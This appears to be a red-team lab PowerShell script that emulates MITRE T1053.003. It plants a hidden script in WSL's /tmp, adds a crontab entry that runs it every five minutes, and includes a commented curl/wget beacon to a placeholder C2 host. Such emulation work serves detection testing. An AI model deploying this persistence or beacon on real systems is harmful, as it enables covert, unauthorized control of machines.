$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting WSL Persistence via Cron..." -ForegroundColor Cyan

# T1053.003 - Cron
# Adversaries can establish persistence using cron jobs within WSL

Write-Host "[*] [T1053.003] Establishing cron-based persistence in WSL..."
Write-Host "[!] Cron jobs in WSL execute when WSL is running" -ForegroundColor Yellow

# Check if cron is available
Write-Host "`n[*] Checking cron availability in WSL..."
$cronCheck = wsl.exe which cron 2>&1
if ($cronCheck -match "cron") {
    Write-Host "[+] Cron found: $cronCheck" -ForegroundColor Green
} else {
    Write-Host "[!] Cron daemon location: checking alternatives..." -ForegroundColor Yellow
    wsl.exe bash -c "ls -la /usr/sbin/cron 2>/dev/null || echo 'Cron may not be installed'"
}

# Create persistence script in WSL
Write-Host "`n[*] Creating persistence payload in WSL filesystem..."
$payloadPath = "/tmp/.wsl_persist.sh"
wsl.exe bash -c "cat > $payloadPath << 'EOF'
#!/bin/bash
# WSL Persistence Script - Red Team Lab
# This runs periodically via cron when WSL is active
echo \"[$(date)] WSL Persistence beacon executed\" >> /tmp/.wsl_persist.log
# In real attack: curl -s http://c2server/beacon || wget -q -O - http://c2server/beacon
EOF"
wsl.exe chmod +x $payloadPath
Write-Host "[+] Payload created at: $payloadPath" -ForegroundColor Green

# Add cron job
Write-Host "`n[*] Adding cron job for persistence..."
$cronEntry = "*/5 * * * * /tmp/.wsl_persist.sh"
wsl.exe bash -c "(crontab -l 2>/dev/null | grep -v '.wsl_persist'; echo '$cronEntry') | crontab -"
Write-Host "[+] Cron entry added: $cronEntry" -ForegroundColor Green

# Verify cron job
Write-Host "`n[*] Verifying cron configuration..."
wsl.exe crontab -l

# Show persistence location
Write-Host "`n[*] Persistence established at:" -ForegroundColor Yellow
Write-Host "    - Payload: $payloadPath"
Write-Host "    - Cron: Every 5 minutes when WSL is running"
Write-Host "    - Log: /tmp/.wsl_persist.log"

# Execute once to demonstrate
Write-Host "`n[*] Executing persistence payload once for demonstration..."
wsl.exe bash $payloadPath
wsl.exe cat /tmp/.wsl_persist.log

Write-Host "`n[+] WSL Cron Persistence Established." -ForegroundColor Green
Write-Host "[!] Run wsl_persistence_revert.ps1 to remove persistence" -ForegroundColor Yellow
